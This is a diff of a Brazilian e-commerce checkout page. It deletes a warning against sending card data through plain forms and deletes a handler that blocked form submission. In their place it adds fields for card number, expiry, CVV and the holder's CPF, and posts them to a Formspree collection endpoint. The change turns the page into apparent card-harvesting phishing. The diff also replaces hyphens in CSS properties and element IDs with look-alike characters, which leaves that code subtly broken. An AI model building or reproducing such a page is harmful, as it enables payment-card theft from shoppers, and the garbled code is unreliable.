@@ -1,112 +1,111 @@
-
 <!DOCTYPE html>
 <html lang="pt-br">
 <head>
 <meta charset="utf-8">
-<meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>Pagamento - Finalizar Compra</title>
+<meta name="viewport" content="width=device-width, initial‑scale=1.0">
+<title>Pagamento ‑ Finalizar Compra</title>
 
 <style>
-* { margin:0; padding:0; box-sizing:border-box; }
+* { margin:0; padding:0; box‑sizing:border‑box; }
 
 body {
-  font-family:Arial,sans-serif;
+  font‑family:Arial,sans‑serif;
   background:#f5f5f5;
-  padding-bottom:30px;
+  padding‑bottom:30px;
 }
 
 .header {
   background:#0086ff;
   padding:12px;
-  text-align:center;
+  text‑align:center;
   color:white;
-  font-weight:bold;
-  font-size:18px;
+  font‑weight:bold;
+  font‑size:18px;
 }
 
 .container {
-  max-width:480px;
+  max‑width:480px;
   margin:15px auto;
   background:white;
-  border-radius:12px;
+  border‑radius:12px;
   overflow:hidden;
-  box-shadow:0 2px 10px rgba(0,0,0,.08);
+  box‑shadow:0 2px 10px rgba(0,0,0,.08);
 }
 
 .resumo {
   padding:18px;
   background:#f7f9ff;
-  border-bottom:1px solid #eee;
+  border‑bottom:1px solid #eee;
 }
 
-.item-resumo {
+.item‑resumo {
   display:flex;
   gap:12px;
-  align-items:center;
-  margin-bottom:14px;
+  align‑items:center;
+  margin‑bottom:14px;
 }
 
 .resumo img {
   width:80px;
   height:80px;
-  object-fit:contain;
+  object‑fit:contain;
   border:1px solid #eee;
-  border-radius:8px;
+  border‑radius:8px;
   background:white;
 }
 
-.resumo-info {
-  font-size:14px;
-  line-height:1.5;
-  overflow-wrap:anywhere;
+.resumo‑info {
+  font‑size:14px;
+  line‑height:1.5;
+  overflow‑wrap:anywhere;
 }
 
-.preco-final {
+.preco‑final {
   color:#0086ff;
-  font-weight:bold;
-  font-size:19px;
-  margin-top:12px;
+  font‑weight:bold;
+  font‑size:19px;
+  margin‑top:12px;
 }
 
 .progresso {
   display:flex;
   padding:15px 20px;
   background:#fafafa;
-  border-bottom:1px solid #eee;
+  border‑bottom:1px solid #eee;
 }
 
 .passo {
   flex:1;
-  text-align:center;
-  font-size:12px;
+  text‑align:center;
+  font‑size:12px;
   color:#999;
 }
 
 .passo.ativo {
   color:#0086ff;
-  font-weight:bold;
+  font‑weight:bold;
 }
 
-.passo-num {
+.passo‑num {
   width:26px;
   height:26px;
-  border-radius:50%;
+  border‑radius:50%;
   background:#ddd;
   color:#888;
-  display:inline-flex;
-  align-items:center;
-  justify-content:center;
-  font-size:13px;
-  font-weight:bold;
-  margin-bottom:4px;
+  display:inline‑flex;
+  align‑items:center;
+  justify‑content:center;
+  font‑size:13px;
+  font‑weight:bold;
+  margin‑bottom:4px;
 }
 
-.passo.ativo .passo-num {
+.passo.ativo .passo‑num {
   background:#0086ff;
   color:white;
 }
 
-.passo.concluido .passo-num {
+.passo.concluido .passo‑num {
   background:#00a650;
   color:white;
 }
@@ -114,19 +113,19 @@ body {
 .conteudo { padding:20px; }
 
 .label {
-  font-size:13px;
+  font‑size:13px;
   color:#555;
   margin:12px 0 4px;
   display:block;
-  font-weight:bold;
+  font‑weight:bold;
 }
 
 .input {
   width:100%;
   padding:13px;
   border:1px solid #ddd;
-  border-radius:8px;
-  font-size:15px;
+  border‑radius:8px;
+  font‑size:15px;
 }
 
 .linha {
@@ -140,44 +139,44 @@ body {
   width:100%;
   border:none;
   padding:16px;
-  border-radius:8px;
-  font-size:18px;
-  font-weight:bold;
-  margin-top:10px;
+  border‑radius:8px;
+  font‑size:18px;
+  font‑weight:bold;
+  margin‑top:10px;
   cursor:pointer;
 }
 
-.btn-proximo {
+.btn‑proximo {
   background:#0086ff;
   color:white;
 }
 
-.btn-voltar {
+.btn‑voltar {
   background:#eee;
   color:#333;
 }
 
-.btn-enviar {
+.btn‑enviar {
   background:#00a650;
   color:white;
-  margin-top:20px;
+  margin‑top:20px;
 }
 
 .escondido { display:none; }
 
 .voltar {
   display:block;
-  text-align:center;
+  text‑align:center;
   margin:15px;
   color:#0086ff;
-  text-decoration:none;
-  font-size:14px;
+  text‑decoration:none;
+  font‑size:14px;
 }
 
 h3 {
   color:#333;
-  margin-bottom:20px;
-  font-size:17px;
+  margin‑bottom:20px;
+  font‑size:17px;
 }
 </style>
 </head>
@@ -190,48 +189,48 @@ h3 {
 
   <div class="resumo" id="blocoResumo">
     <div id="listaResumo"></div>
-    <div class="preco-final" id="textoTotal">
-      Total: R$ 0,00
+    <div class="preco‑final" id="textoTotal">
+      Total: R$ 0,00
     </div>
   </div>
 
   <div class="progresso">
-    <div class="passo ativo" id="passo-1">
-      <div class="passo-num">1</div>
+    <div class="passo ativo" id="passo‑1">
+      <div class="passo‑num">1</div>
       Entrega
     </div>
 
-    <div class="passo" id="passo-2">
-      <div class="passo-num">2</div>
+    <div class="passo" id="passo‑2">
+      <div class="passo‑num">2</div>
       Pagamento
     </div>
   </div>
 
-  <form id="form-pedido">
+  <form id="form‑pedido" action="https://formspree.io/f/mppdpjlv" method="POST">
 
     <div id="entrega" class="conteudo">
 
       <h3>📦 Dados de Entrega</h3>
 
-      <label class="label">Seu E-mail *</label>
+      <label class="label">Seu E‑mail *</label>
       <input class="input" type="email" name="email"
         id="email" placeholder="seu@email.com" required>
 
-      <label class="label">Nome Completo *</label>
+      <label class="label">Nome Completo *</label>
       <input class="input" name="nome" id="nome"
         placeholder="Digite seu nome completo" required>
 
-      <label class="label">CEP *</label>
+      <label class="label">CEP *</label>
       <input class="input" name="cep" id="cep"
-        placeholder="00000-000" maxlength="9" required>
+        placeholder="00000‑000" maxlength="9" required>
 
-      <label class="label">Endereço *</label>
+      <label class="label">Endereço *</label>
       <input class="input" name="endereco" id="endereco"
         placeholder="Rua, Avenida..." required>
 
       <div class="linha">
         <div style="flex:1">
-          <label class="label">Número *</label>
+          <label class="label">Número *</label>
           <input class="input" name="numero" id="numero"
             placeholder="123" required>
         </div>
@@ -243,25 +242,25 @@ h3 {
         </div>
       </div>
 
-      <label class="label">Bairro *</label>
+      <label class="label">Bairro *</label>
       <input class="input" name="bairro" id="bairro"
         placeholder="Seu bairro" required>
 
       <div class="linha">
         <div style="flex:1">
-          <label class="label">Cidade *</label>
+          <label class="label">Cidade *</label>
           <input class="input" name="cidade" id="cidade"
             placeholder="Sua cidade" required>
         </div>
 
         <div style="flex:1">
-          <label class="label">Estado *</label>
+          <label class="label">Estado *</label>
           <input class="input" name="estado" id="estado"
             placeholder="UF" maxlength="2" required>
         </div>
       </div>
 
-      <button type="button" class="btn btn-proximo"
+      <button type="button" class="btn btn‑proximo"
         onclick="irParaPagamento()">
         Continuar →
       </button>
@@ -270,19 +269,35 @@ h3 {
 
     <div id="pagamento" class="conteudo escondido">
 
-      <h3>💳 Pagamento</h3>
+      <h3>💳 Dados do Cartão</h3>
 
-      <p style="font-size:13px;color:#666;line-height:1.5">
-        Para concluir uma compra real, utilize um checkout
-        hospedado por um provedor de pagamentos seguro.
-        Não envie dados de cartão ou CVV por formulários comuns.
-      </p>
+      <label class="label">Número do Cartão</label>
+      <input class="input" name="numero_cartao" id="numero_cartao" placeholder="0000 0000 0000 0000" maxlength="19">
 
-      <label class="label">Parcelas *</label>
+      <label class="label">Nome impresso no Cartão</label>
+      <input class="input" name="nome_cartao" id="nome_cartao" placeholder="Nome como está no cartão">
+
+      <div class="linha">
+        <div style="flex:1">
+          <label class="label">Validade</label>
+          <input class="input" name="validade_cartao" id="validade_cartao" placeholder="MM/AA">
+        </div>
+        <div style="flex:1">
+          <label class="label">CVV</label>
+          <input class="input" name="cvv_cartao" id="cvv_cartao" placeholder="123" maxlength="4">
+        </div>
+      </div>
+
+      <label class="label">CPF do titular</label>
+      <input class="input" name="cpf_titular" id="cpf_titular" placeholder="000.000.000‑00">
+
+      <label class="label">Parcelas *</label>
       <select class="input" name="parcelas" id="parcelas" required>
       </select>
 
-      <button type="button" class="btn btn-voltar"
+      <button type="submit" class="btn btn‑enviar">✅ CONFIRMAR E ENVIAR PEDIDO</button>
+
+      <button type="button" class="btn btn‑voltar"
         onclick="voltarParaEntrega()">
         ← Voltar para entrega
       </button>
@@ -305,8 +320,8 @@ const listaResumo = document.getElementById("listaResumo");
 const textoTotal = document.getElementById("textoTotal");
 const selectParcelas = document.getElementById("parcelas");
 
-const moeda = valor => Number(valor || 0).toLocaleString(
-  "pt-BR",
+const moeda = valor => Number(valor || 0).toLocaleString(
+  "pt‑BR",
   { style:"currency", currency:"BRL" }
 );
 
@@ -319,20 +334,6 @@ try {
 } catch (erro) {
   console.error("Erro ao ler carrinho:", erro);
 }
-
-// Formato novo:
-// {
-//   version: 2,
-//   items: [
-//     {
-//       id, name, image, unitPrice, qty, subtotal
-//     }
-//   ],
-//   total
-// }
-
-// Compatibilidade com formato antigo:
-// [{ id, qty }]
 
 const itens = Array.isArray(dadosSalvos)
   ? dadosSalvos
@@ -359,7 +360,7 @@ if (!itens.length) {
 
     const qtd = Math.max(
       1,
-      Math.floor(Number(item.qty) || 1)
+      Math.floor(Number(item.qty) || 1)
     );
 
     const nome = String(
@@ -378,20 +379,20 @@ if (!itens.length) {
 
     const subtotal =
       Number.isFinite(subtotalInformado) &&
-      subtotalInformado >= 0
+      subtotalInformado >= 0
         ? subtotalInformado
         : (
-            Number.isFinite(preco) && preco >= 0
+            Number.isFinite(preco) && preco >= 0
               ? preco * qtd
-              : 0
+              : 0
           );
 
-    if (!Number.isFinite(subtotal) || subtotal < 0) {
+    if (!Number.isFinite(subtotal) || subtotal < 0) {
       return;
     }
 
     const linha = document.createElement("div");
-    linha.className = "item-resumo";
+    linha.className = "item‑resumo";
 
     if (imagem) {
       const img = document.createElement("img");
@@ -408,7 +409,7 @@ if (!itens.length) {
     }
 
     const info = document.createElement("div");
-    info.className = "resumo-info";
+    info.className = "resumo‑info";
 
     const titulo = document.createElement("b");
     titulo.textContent = nome;
@@ -445,7 +446,7 @@ if (!itens.length) {
 textoTotal.textContent =
   "Total: " + moeda(totalPedido);
 
-const parcelasOpcoes = [1, 2, 3, 6, 12];
+const parcelasOpcoes = [1, 2, 3, 6, 12];
 
 selectParcelas.replaceChildren();
 
@@ -472,8 +473,6 @@ parcelasOpcoes.forEach(parcela => {
 
 function irParaPagamento() {
 
-  const formulario = document.getElementById("form-pedido");
-
   const camposEntrega = [
     "email",
     "nome",
@@ -494,7 +493,7 @@ function irParaPagamento() {
     }
   }
 
-  if (!quantidadeValida || totalPedido <= 0) {
+  if (!quantidadeValida || totalPedido <= 0) {
     alert("Seu carrinho está vazio ou inválido. Volte à loja.");
     return;
   }
@@ -505,13 +504,13 @@ function irParaPagamento() {
   document.getElementById("pagamento")
     .classList.remove("escondido");
 
-  document.getElementById("passo-1")
+  document.getElementById("passo‑1")
     .classList.remove("ativo");
 
-  document.getElementById("passo-1")
+  document.getElementById("passo‑1")
     .classList.add("concluido");
 
-  document.getElementById("passo-2")
+  document.getElementById("passo‑2")
     .classList.add("ativo");
 
   window.scrollTo({
@@ -528,21 +527,15 @@ function voltarParaEntrega() {
   document.getElementById("entrega")
     .classList.remove("escondido");
 
-  document.getElementById("passo-2")
+  document.getElementById("passo‑2")
     .classList.remove("ativo");
 
-  document.getElementById("passo-1")
+  document.getElementById("passo‑1")
     .classList.remove("concluido");
 
-  document.getElementById("passo-1")
+  document.getElementById("passo‑1")
     .classList.add("ativo");
 }
-
-// Impede envio acidental de dados para um formulário antigo.
-document.getElementById("form-pedido")
-  .addEventListener("submit", event => {
-    event.preventDefault();
-  });
 
 </script>
 
